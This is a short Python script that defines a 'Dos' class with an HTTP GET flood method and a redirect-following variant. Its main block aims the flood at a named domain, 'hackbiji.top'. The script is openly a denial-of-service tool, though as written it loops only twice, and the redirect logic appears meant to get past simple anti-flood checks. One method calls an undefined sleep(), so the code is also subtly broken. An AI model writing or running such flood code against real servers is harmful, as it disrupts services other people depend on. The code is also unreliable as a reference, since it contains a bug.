import http.client
import time

class Dos(object):
    def __init__(self):
        pass

    def httpGetFlood(self,sleepTime,servAddr,url):
        for i in range(2):
            time.sleep(sleepTime)
            try:
                conn = http.client.HTTPConnection(servAddr)
                conn.request('GET',url)
                r1 = conn.getresponse()
                print(r1.status,r1.reason)
                conn.close()
            except IOError as e:
                print("except:",e)
            finally:
                print("httpGetFlood END")

    def httpGetNormal(self,sleepTime,servAddr,url):
        for i in range(2):
            sleep(sleepTime)
            try:
                conn0 = http.client.HTTPConnection(servAddr)
                conn0.request('GET',url)
                r0 = conn0.getresponse()
                flag = 0
                if r0.status == 307:
                    flag = 1
                    conn0.close()
                    conn1 = http.client.HTTPConnection(servAddr)
                    url = r0.getheaders()[1][1]
                    print(url)
                    conn1.request('GET',url)
                    r1 = conn1.getresponse()
                    print(r1.status)
                    conn1.close()
                if flag == 0:
                    conn0.close()
            except IOError as e:
                print(e)
            finally:
                print("httpGetNormal END")



if __name__ == '__main__':
    servAddr = "hackbiji.top"
    url = "/"
    sleepTime = 0.1
    hack = Dos()
    hack.httpGetFlood(sleepTime,servAddr,url)